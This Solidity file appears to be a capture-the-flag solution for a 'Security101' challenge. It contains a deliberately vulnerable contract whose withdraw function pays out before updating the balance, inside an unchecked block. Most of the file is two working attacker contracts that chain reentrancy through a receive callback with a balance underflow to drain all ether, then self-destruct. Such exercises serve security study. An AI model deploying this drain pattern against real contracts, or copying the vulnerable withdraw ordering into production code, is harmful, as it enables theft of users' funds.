// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
// in order to `receive` callback, we have to add a new contract and attack outside constructor
contract AttackerMiddle {
    constructor() payable {}

    function attack(Security101 token) external payable {
        uint value = address(this).balance;
        token.deposit{value: value}();
        token.withdraw(value);
        token.withdraw(address(token).balance);
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        if (msg.value == address(this).balance) {
            Security101(msg.sender).withdraw(msg.value);
        }
    }
}

// when selfdestruct, nothing would write to code, saving gas.
contract OptimizedAttackerSecurity101 {
    constructor(address _token) payable {
        new AttackerMiddle{value: msg.value}().attack(Security101(_token));
        selfdestruct(payable(msg.sender));
    }
}
